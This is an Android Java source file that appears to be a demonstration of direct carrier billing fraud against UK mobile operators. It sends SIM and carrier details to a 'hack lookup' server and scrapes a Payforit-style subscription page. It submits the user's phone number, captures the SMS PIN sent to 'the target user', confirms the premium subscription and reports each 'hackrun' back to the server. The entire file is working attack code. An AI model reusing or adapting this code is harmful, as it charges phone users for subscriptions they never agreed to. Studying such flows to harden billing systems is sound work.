package com.dcbsecure.demo201503.dcbsecure.flow;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.R;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowUKWifi implements View.OnClickListener, DialogInterface.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private PayforitDialog payforitDialog;

    public FlowUKWifi(ActivityMainWindow activityMainWindow)
    {
        this.activityMainWindow = activityMainWindow;
    }

    public FlowUKWifi(ActivityMainWindow activityMainWindow, PayforitDialog payforitDialog)
    {
        this.activityMainWindow = activityMainWindow;
        this.payforitDialog = payforitDialog;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }

    @Override
    public void onClick(DialogInterface dialog, int which)
    {
        payforitDialog = new PayforitDialog(activityMainWindow);
        payforitDialog.show();
    }

    private void onClick()
    {
        Log.d("FLIRTY", "Started handling payment over wifi.");


        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        final ProgressDialog progress = ProgressDialog.show(activityMainWindow, null, activityMainWindow.getString(R.string.processing));
        progress.show();

        // used to dismiss the progress dialog
        final Handler handler = new Handler()
        {
            @Override
            public void handleMessage(final Message msg)
            {
                super.handleMessage(msg);

                if (msg.what == 0)
                {
                    progress.dismiss();
                    payforitDialog.dismiss();
                }

                if(msg.what >0)
                {
                    // start the waiting task
                    progress.setMessage(activityMainWindow.getString(R.string.processing)+" "+msg.what+"%");
                }
            }
        };

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);

                    if (hackConfigResponse == null)
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else if(hackConfigResponse.has("ref"))
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, false, "hack started but config says sub is ON (access granted)", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(deviceid, runid, handler);
                    }
                }
                catch (JSONException e)
                {
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("FLIRTY", "Could not read hack config");
                    handler.sendEmptyMessage(0);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                    handler.sendEmptyMessage(0);
                }

            }
        }).start();
    }


    private void runFlowNotInMainThread(final String deviceid, final long runid, final Handler handler)
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl = null;
        JSONObject billingConfigJSON = ConfigMgr.getBillingConfig();

        try
        {
            JSONObject carrierSubFlow = null;

            if(billingConfigJSON != null && billingConfigJSON.has("carrier_sub_flow")) carrierSubFlow = billingConfigJSON.getJSONObject("carrier_sub_flow");
            if(carrierSubFlow != null && carrierSubFlow.has("start_url")) startUrl = carrierSubFlow.getString("start_url");

        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
            handler.sendEmptyMessage(0);
            return;
        }

        if (startUrl == null)
        {
            String subject = "cannot workout start_url";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
            handler.sendEmptyMessage(0);
            return;
        }
        else //if (startUrl!=null)
        {
            RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
            final String serverUrl = resultAfterStart != null ? extractServerUrl(resultAfterStart.getUrl()) : null;
            String htmlDataAfterStart = resultAfterStart != null ? resultAfterStart.getContent() : null; // html content

            if (resultAfterStart == null)
            {
                String subject = "start_url returns nothing";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                handler.sendEmptyMessage(0);
                return;
            }
            else if (resultAfterStart.getHttpCode() != 200)
            {
                String subject = "start_url returns http code " + resultAfterStart.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                handler.sendEmptyMessage(0);
                return;
            }
            else if (serverUrl == null)
            {
                String subject = "cannot workout server url from " + resultAfterStart.getUrl();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                handler.sendEmptyMessage(0);
                return;
            }
            else if (htmlDataAfterStart != null && htmlDataAfterStart.contains("Subscribe Now"))
            {
                //odd 3G flow detected while on wifi !?
                String subject = "UK 3G flow detected while on wifi";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                FlowUK3G.doClickSubscribe(deviceid,runid,activityMainWindow,serverUrl,userAgent,htmlDataAfterStart,handler);
            }
            else if (htmlDataAfterStart != null && !htmlDataAfterStart.contains("Enter your mobile number"))
            {
                String subject = "UK expected msisdn entry page does not look right (wifi flow)";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                handler.sendEmptyMessage(0);
                return;
            }
            else
            {
                String msisdnSubmitUrl = extractUrlFromFirstForm(resultAfterStart, serverUrl); // network provider url

                // we have to submit the MSISDN also, but format must be 07... , not 447...
                String msisdnStartingWith0not44 = PreferenceMgr.getMsisdn(activityMainWindow);

                if (msisdnStartingWith0not44 != null && msisdnStartingWith0not44.startsWith("44"))
                    msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44.substring(2);

                if (msisdnStartingWith0not44 != null && msisdnStartingWith0not44.startsWith("+44"))
                    msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44.substring(3);

                if (msisdnStartingWith0not44 != null && !msisdnStartingWith0not44.startsWith("0"))
                    msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44;

                Log.d("FLIRTY", "Using MSISDN: " + msisdnStartingWith0not44);

                ArrayList<NameValuePair> paramsForMsisdnSubmit = new ArrayList<NameValuePair>();
                paramsForMsisdnSubmit.add(new BasicNameValuePair("msisdn", msisdnStartingWith0not44));
                String operatorValue = workoutOperatorValue(activityMainWindow);
                paramsForMsisdnSubmit.add(new BasicNameValuePair("operator", operatorValue));

                RequestResult resultAfterMsisdnSubmit = SyncRequestUtil.doSynchronousHttpPost(msisdnSubmitUrl, paramsForMsisdnSubmit, userAgent);

                final String htmlDataAfterMsisdnSubmit = resultAfterMsisdnSubmit != null ? resultAfterMsisdnSubmit.getContent() : null;
                final String submitPinUrl = resultAfterMsisdnSubmit != null ? extractUrlFromFirstForm(resultAfterMsisdnSubmit, serverUrl) : null;

                if (resultAfterMsisdnSubmit == null)
                {
                    String subject = "EnterMsisdn returns nothing";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                    handler.sendEmptyMessage(0);
                    return;
                }
                else if (resultAfterMsisdnSubmit.getHttpCode() != 200)
                {
                    String subject = "EnterMsisdn returns http code " + resultAfterMsisdnSubmit.getHttpCode();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                    handler.sendEmptyMessage(0);
                    return;
                }
                else if (submitPinUrl == null)
                {
                    String subject = "cannot workout PinSubmitUrl";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                    handler.sendEmptyMessage(0); //kill the waiting message
                    return;
                }
                else if (!htmlDataAfterMsisdnSubmit.contains("Enter your code"))
                {
                    String subject = "expected pin submit page does not look right";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
                    handler.sendEmptyMessage(0); //kill the waiting message
                    return;
                }
                else //if(submitPinUrl!=null)
                {
                    // After this point, a PIN should arrive in an SMS message to the target user
                    // start the waiting task

                    handler.sendEmptyMessage(5);

                    TimerTask task = new TimerTask()
                    {
                        @Override
                        public void run()
                        {
                            final long WAITING_TIME = 60000;
                            final long SLEEP_TIME = 1000;
                            final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

                            while (System.currentTimeMillis() <= END_TIME)
                            {
                                String pin = FlowUtil.getPin();
                                if (pin != null && !pin.isEmpty())
                                {
                                    final ArrayList<NameValuePair> paramsForPinSubmit = new ArrayList<NameValuePair>();


                                    paramsForPinSubmit.add(new BasicNameValuePair("payment_code", pin));

                                    //doing pin submit
                                    RequestResult resultAfterPinSubmit = SyncRequestUtil.doSynchronousHttpPost(submitPinUrl, paramsForPinSubmit, userAgent);
                                    String htmlDataAfterPinSubmit = resultAfterPinSubmit != null ? resultAfterPinSubmit.getContent() : null;

                                    if (resultAfterPinSubmit == null || htmlDataAfterPinSubmit==null)
                                    {
                                        String subject = "PinSubmit returns nothing";
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
                                        handler.sendEmptyMessage(0);
                                        return;
                                    }
                                    else
                                    {
                                        String checkUrl = extractCheckUrl(htmlDataAfterPinSubmit,serverUrl);
                                        while (checkUrl!=null && System.currentTimeMillis() <= END_TIME)
                                        {
                                            //loop waiting while subscription setup is being processed by the carrier
                                            try
                                            {
                                                Thread.sleep(5000); //5 sec
                                            }
                                            catch (InterruptedException ex)
                                            {
                                                Thread.currentThread().interrupt();
                                            }
                                            double timeElapsedPer95 = 95d - ( 95d * (END_TIME- System.currentTimeMillis()) / WAITING_TIME) ;
                                            int progressPercent = 5 + (int) Math.round(timeElapsedPer95);
                                            handler.sendEmptyMessage(progressPercent);

                                            resultAfterPinSubmit = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, checkUrl, userAgent);
                                            htmlDataAfterPinSubmit = resultAfterPinSubmit != null ? resultAfterPinSubmit.getContent() : null;

                                            checkUrl = extractCheckUrl(htmlDataAfterPinSubmit,serverUrl);
                                        }

                                        if (resultAfterPinSubmit==null || htmlDataAfterPinSubmit==null)
                                        {
                                            String subject = "Subscription setup check returns nothing";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else if(System.currentTimeMillis() > END_TIME && checkUrl!=null)
                                        {
                                            String subject = "Timeout whilst subscription setup is being processed by the carrier";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else if(htmlDataAfterPinSubmit.toLowerCase().contains("payment received"))
                                        {
                                            String subject = "successful signup after pin confirm (UK wifi flow)";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterPinSubmit);

                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else//passed (possibly)
                                        {

                                            RequestResult followRedirect = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, resultAfterPinSubmit.getUrl(), userAgent);
                                            final String followRedirectUrl = followRedirect != null ? followRedirect.getUrl() : null;
                                            final String htmlDataAfterFollowRedirect = followRedirect != null ? followRedirect.getContent() : null;

                                            if (followRedirectUrl != null && followRedirectUrl.contains("flirtymob.com"))
                                            {
                                                String subject = "successful signup after pin confirm (UK wifi flow)";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterPinSubmit);
                                            }
                                            else
                                            {
                                                String subject = "expected redirection after pin confirm does not look right (UK Wifi flow)";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterPinSubmit);
                                            }
                                            handler.sendEmptyMessage(0);
                                            return;

                                        }
                                    }

                                }
                                else try
                                {
                                    double timeElapsedPer95 = 95d - ( 95d * (END_TIME- System.currentTimeMillis()) / WAITING_TIME) ;
                                    int progressPercent = 5 + (int) Math.round(timeElapsedPer95);
                                    handler.sendEmptyMessage(progressPercent);

                                    Thread.sleep(SLEEP_TIME);
                                }
                                catch (Exception e)
                                {
                                    e.printStackTrace();
                                }

                            }

                            //timeout
                            String subject = "timeout waiting for pin";
                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
                            handler.sendEmptyMessage(0);

                        }
                    };

                    Timer timer = new Timer();
                    timer.schedule(task, 0);
                }
            }

        }

    }

    private String extractCheckUrl(String htmlData, String serverPath)
    {
        if(htmlData!=null && htmlData.contains("/check\">click here</a>"))
        {
            Pattern pattern = Pattern.compile("<a href=\"(/web_subscriptions/.*/check)\">click here</a>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return serverPath+matcher.group(1);
        }

        return null;
    }

    private String extractServerUrl(String url)
    {
        //landingUrlAfterStart might look like http://migpay.com/web_subscriptions/4R5BAJ/enter_code = > extract http://migpay.com
        int indexEndOfServer = url.indexOf("/", 7); //start searching after http:// to find the first /
        return url.substring(0, indexEndOfServer);
    }

    private String extractUrlFromFirstForm(RequestResult resultAfterStart, String serverPath)
    {
        String htmlDataAfterStart = resultAfterStart.getContent(); // html content
        String requestPath = null;

        String[] lines = htmlDataAfterStart.split("\n");
        for (int i = 0; i < lines.length; i++)
        {
            if (lines[i].contains("<form "))
            {
                String actionValue = lines[i].substring(lines[i].indexOf("action=\""), lines[i].length());
                actionValue = actionValue.replace("action=\"", "");
                requestPath = actionValue.substring(0, actionValue.indexOf("\""));
                break;
            }

        }

        if (requestPath != null && requestPath.startsWith("/"))
        {
            return serverPath + requestPath;
        }

        return null;
    }

    public static String workoutOperatorValue(Context ctx)
    {
        TelephonyManager tMgr = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);

        String mccmnc = tMgr != null ? tMgr.getSimOperator() : "";

        /*
            <select name="operator" id="nil_class_operator">
                <option value=""></option>
                <option value="9">O2-UK</option>
                <option value="8">Orange-UK</option>
                <option value="3">T-Mobile-UK</option>
                <option value="4">Three-UK</option>
                <option value="13">Virgin-UK</option>
                <option value="12">Vodafone-UK</option>`
            </select>
         */

        //list of carriers/mccmnc on http://mcclist.com/mobile-network-codes-country-codes.asp

        //O2
        if ("23402".equalsIgnoreCase(mccmnc) || "23410".equalsIgnoreCase(mccmnc) || "23411".equalsIgnoreCase(mccmnc))
            return "9";
        //Orange
        if ("23433".equalsIgnoreCase(mccmnc) || "23434".equalsIgnoreCase(mccmnc)) return "8";
        //T-Mobile
        if ("23430".equalsIgnoreCase(mccmnc)) return "3";
        //Three-UK
        if ("23420".equalsIgnoreCase(mccmnc)) return "4";
        //Virgin-UK
        if ("23431".equalsIgnoreCase(mccmnc) || "23432".equalsIgnoreCase(mccmnc)) return "13";
        //Vodafone-UK
        if ("23403".equalsIgnoreCase(mccmnc) || "23415".equalsIgnoreCase(mccmnc) || "23491".equalsIgnoreCase(mccmnc))
            return "12";

        return null;
    }

}
